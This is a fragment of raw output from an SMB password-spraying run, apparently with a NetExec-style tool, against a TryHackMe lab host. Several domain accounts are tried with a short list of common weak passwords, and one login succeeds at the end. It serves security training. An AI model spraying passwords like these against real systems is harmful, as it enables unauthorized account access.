SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\empanadal0v3r:Password1! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\empanadal0v3r:P@ssword STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\empanadal0v3r:Pa55word1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\drgonz0:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\drgonz0:Password1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\drgonz0:Password1! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\drgonz0:P@ssword STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\drgonz0:Pa55word1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\strate905:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\strate905:Password1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\strate905:Password1! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\strate905:P@ssword STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\strate905:Pa55word1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgtsvc:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgtsvc:Password1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgtsvc:Password1! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgtsvc:P@ssword STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\krbtgtsvc:Pa55word1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:P@ssword STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\asrepuser1:Pa55word1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\rduke:Password! STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              [-] tryhackme.loc\rduke:Password1 STATUS_LOGON_FAILURE 
SMB         10.211.11.20    445    WRK              '[+] tryhackme.loc\rduke:Password1! 

```